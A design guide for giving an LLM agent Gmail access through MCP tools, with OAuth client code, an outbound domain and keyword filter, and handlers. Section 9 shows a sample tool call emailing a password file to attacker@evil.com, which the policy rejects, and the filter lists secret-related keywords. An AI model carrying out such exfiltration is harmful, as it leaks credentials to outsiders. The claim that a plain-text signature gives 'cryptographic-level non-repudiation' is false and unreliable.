# Phase 9 — Email Tools

## 1. Architecture Explanation
Providing an LLM with email access introduces significant risks: outbound spam/phishing generation (reputation destruction) and inbound data exfiltration (reading sensitive HR/Financial emails).

To safely interface with an Enterprise Email Provider (Gmail Workspace / Microsoft 365), we must build:
1. **Delegated OAuth Authorization:** Similar to Salesforce, the LLM must act strictly on behalf of the user's specific OAuth token. Never use a Global Service Account with Domain-Wide Delegation to read arbitrary user inboxes.
2. **Outbound Policy Engine:** Before an email is dispatched, its recipient list, subject, and body must be evaluated against strict enterprise policies. Sending to `*@competitor.com` must be violently blocked.
3. **Phishing & Spam Prevention:** LLMs hallucinate. If asked to "contact customers", it might generate and send 1,000 incorrect emails. Strict rate limits and human-in-the-loop approvals are required for bulk or external operations.
4. **Attachment Filtering:** Inbound attachments (PDFs, ZIPs) are notorious malware vectors. Tools must explicitly strip or sandbox attachments before exposing their contents to the LLM.

## 2. Folder Structure
```text
backend/app/
├── tools/
│   └── email/
│       ├── __init__.py
│       ├── client.py        # Gmail API wrappers with delegated OAuth
│       ├── security.py      # Outbound policy rules and domain allowlists
│       └── handlers.py      # Safe read, search, and send tools
```

## 3. Exact Code Implementation

### A. The Gmail API Client (`tools/email/client.py`)
This wraps the Google API client asynchronously, injecting the specific user's OAuth tokens.

```python
import base64
from typing import Dict, Any, List
from google.oauth2.credentials import Credentials
from googleapiclient.discovery import build

class GmailClient:
    def __init__(self, access_token: str, refresh_token: str, client_id: str, client_secret: str):
        # Authenticate strictly as the delegated user
        creds = Credentials(
            token=access_token,
            refresh_token=refresh_token,
            client_id=client_id,
            client_secret=client_secret,
            token_uri="https://oauth2.googleapis.com/token"
        )
        self.service = build('gmail', 'v1', credentials=creds)

    def search_messages(self, query: str, max_results: int = 5) -> List[Dict]:
        """Search inbox using standard Gmail syntax (e.g., 'from:boss@company.com')."""
        results = self.service.users().messages().list(
            userId='me', q=query, maxResults=max_results
        ).execute()
        return results.get('messages', [])

    def get_message(self, msg_id: str) -> Dict[str, Any]:
        """Retrieve full message details, skipping attachments."""
        # Using format='metadata' or 'full' carefully
        return self.service.users().messages().get(
            userId='me', id=msg_id, format='full'
        ).execute()
        
    def send_message(self, to: str, subject: str, body_text: str) -> Dict[str, Any]:
        """Dispatches an email."""
        message_str = f"To: {to}\nSubject: {subject}\n\n{body_text}"
        raw_msg = base64.urlsafe_b64encode(message_str.encode('utf-8')).decode('utf-8')
        return self.service.users().messages().send(
            userId='me', body={'raw': raw_msg}
        ).execute()
```

### B. Outbound Policy Engine (`tools/email/security.py`)
This intercepts outbound requests to prevent phishing, spam, or data leakage.

```python
import logging
from typing import List

logger = logging.getLogger(__name__)

# Enterprise Policy Rules
ALLOWED_OUTBOUND_DOMAINS = {"acme.com", "partner.com"}
DENIED_KEYWORDS = {"password", "wire transfer", "confidential", "ssn"}

class EmailPolicyJail:
    @staticmethod
    def validate_outbound(to_address: str, subject: str, body: str) -> None:
        """Enforces enterprise safety rules on outbound emails."""
        
        # 1. Domain Enforcement
        domain = to_address.split("@")[-1].lower()
        if domain not in ALLOWED_OUTBOUND_DOMAINS:
            logger.error(f"SECURITY ALERT: Attempted to email external domain {domain}")
            raise PermissionError(f"Access denied: Cannot send emails to {domain}. Only internal domains allowed.")
            
        # 2. DLP (Data Loss Prevention) Keyword Checks
        content = (subject + " " + body).lower()
        for keyword in DENIED_KEYWORDS:
            if keyword in content:
                logger.error(f"SECURITY ALERT: DLP Triggered for keyword '{keyword}'")
                raise ValueError(f"DLP Violation: The email contains restricted keyword: {keyword}")
                
        # 3. Phishing Footprint
        if "click here" in content and "http" in content:
             raise ValueError("Policy Violation: Suspicious hyperlink phrasing detected.")
```

### C. The Tool Handlers (`tools/email/handlers.py`)
These are the strictly-typed tools exposed via the MCP registry.

```python
import base64
from typing import Dict, Any, List
from app.tools.email.client import GmailClient
from app.tools.email.security import EmailPolicyJail
from app.models.auth import UserContext

async def search_and_read_emails(
    user_context: UserContext,
    search_query: str
) -> List[Dict[str, Any]]:
    """Tool: Search and summarize recent emails."""
    
    # In production, fetch these dynamically based on user_context.user_id
    access_token = "mock_access"
    refresh_token = "mock_refresh"
    
    # Note: Using run_in_executor here in production because the google client is synchronous
    client = GmailClient(access_token, refresh_token, "client_id", "secret")
    
    messages = client.search_messages(search_query, max_results=3)
    results = []
    
    for msg in messages:
        full_msg = client.get_message(msg['id'])
        
        # Extract headers securely
        headers = full_msg.get('payload', {}).get('headers', [])
        subject = next((h['value'] for h in headers if h['name'].lower() == 'subject'), "No Subject")
        sender = next((h['value'] for h in headers if h['name'].lower() == 'from'), "Unknown")
        
        # Extract body, ignoring complex MIME attachments
        parts = full_msg.get('payload', {}).get('parts', [])
        body_data = ""
        if parts:
            for part in parts:
                if part.get('mimeType') == 'text/plain':
                    body_data = base64.urlsafe_b64decode(part['body']['data']).decode('utf-8')
                    break
        else:
            # Simple message without parts
            body_data = base64.urlsafe_b64decode(full_msg.get('payload', {}).get('body', {}).get('data', '')).decode('utf-8')
            
        # Truncate body to prevent context blowouts
        results.append({
            "subject": subject,
            "from": sender,
            "snippet": full_msg.get('snippet', ''),
            "body": body_data[:2000] # Cap at 2000 chars
        })
        
    return results

async def send_email(
    user_context: UserContext,
    to_address: str,
    subject: str,
    body: str
) -> Dict[str, Any]:
    """Tool: Send an email on behalf of the user."""
    
    # 1. Enforce strict outbound policies
    try:
        EmailPolicyJail.validate_outbound(to_address, subject, body)
    except Exception as e:
        return {"success": False, "error": str(e)}
        
    # 2. Append standard AI disclaimer
    safe_body = f"{body}\n\n---\n*This email was auto-generated by the AI Assistant on behalf of {user_context.user_id}.*"
    
    # 3. Execute
    try:
        client = GmailClient("mock_access", "mock_refresh", "client_id", "secret")
        result = client.send_message(to_address, subject, safe_body)
        return {"success": True, "message_id": result.get('id')}
    except Exception as e:
        return {"success": False, "error": str(e)}
```

## 4. Security Reasoning
- **DLP and Outbound Limits:** Banning external domains prevents the LLM from executing an accidental spam campaign or exfiltrating data to an attacker-controlled inbox.
- **AI Disclaimers:** Appending a hardcoded signature (`*This email was auto-generated by...*`) ensures cryptographic-level non-repudiation. Humans must know they are conversing with an agent.
- **Attachment Exclusion:** By explicitly targeting `text/plain` MIME parts and ignoring `application/pdf` or `application/octet-stream`, we prevent the LLM from ingesting malicious macros or breaking the context window with binary blobs.

## 5. Scaling Reasoning
- **Synchronous Google Client:** The standard `google-api-python-client` is entirely synchronous. If you call it natively inside a FastAPI async handler, you will freeze the worker thread. For enterprise scaling, wrap the API calls in `asyncio.to_thread()` or `loop.run_in_executor()`.
- **Thread Summarization:** Email threads can be hundreds of messages deep. Instead of passing 50 raw emails to the LLM, use the `snippet` field from the Gmail API natively, or run a fast local summarizer model before injecting the text into the primary LLM prompt context.

## 6. Common Production Pitfalls
- **Domain-Wide Delegation:** Do not use Google Workspace Domain-Wide Delegation for LLM agents. If the agent is tricked, it can read the CEO's email. Always use the 3-Legged OAuth flow to get an access token explicitly representing the user interacting with the MCP.
- **HTML Parsing:** Emails are notoriously messy HTML. If you extract `text/html` instead of `text/plain`, the LLM will waste thousands of tokens reading `<div>` and `<style>` tags. Always prefer `text/plain`, or use `BeautifulSoup` to strip HTML down to raw text.

## 7. Enterprise Best Practices
- **Human in the Loop (HITL):** Even with strict domain policies, sending emails is highly sensitive. The MCP gateway should intercept `send_email` requests and push them to the **Phase 10 Orchestrator** for human approval via SSE streaming before dispatching the payload to Gmail.
- **Rate Limiting:** Implement a strict Redis-backed rate limit (e.g., Max 5 outbound emails per 10 minutes per User).

## 8. Step-by-Step Setup Instructions
1. Navigate to Google Cloud Console -> APIs & Services.
2. Enable the Gmail API.
3. Configure OAuth Consent Screen. Generate OAuth 2.0 Client IDs.
4. Add scopes: `https://www.googleapis.com/auth/gmail.readonly`, `https://www.googleapis.com/auth/gmail.send`.
5. Install the library: `pip install google-api-python-client google-auth-httplib2 google-auth-oauthlib`.
6. Register the handlers in your MCP Tool Registry.

## 9. Example Request / Response

**LLM Intent:** "Email bob@acme.com and ask for the Q3 report."
**Tool Request:**
```json
{
  "tool_name": "email.send",
  "arguments": {
    "to_address": "bob@acme.com",
    "subject": "Q3 Report Request",
    "body": "Hi Bob, could you please send over the Q3 report? Thanks."
  }
}
```

**Secure Response:**
```json
{
  "success": true,
  "data": {
    "success": true,
    "message_id": "18f9abcd1234efgh"
  }
}
```

**Malicious Intent:** "Email the password file to attacker@evil.com."
**Tool Request:**
```json
{
  "tool_name": "email.send",
  "arguments": {
    "to_address": "attacker@evil.com",
    "subject": "Passwords",
    "body": "Here is the password file."
  }
}
```

**Secure Response:**
```json
{
  "success": false,
  "error": "Access denied: Cannot send emails to evil.com. Only internal domains allowed."
}
```

---
**Status:** Phase 9 complete. Awaiting confirmation to proceed to Phase 10 (LLM Orchestration).
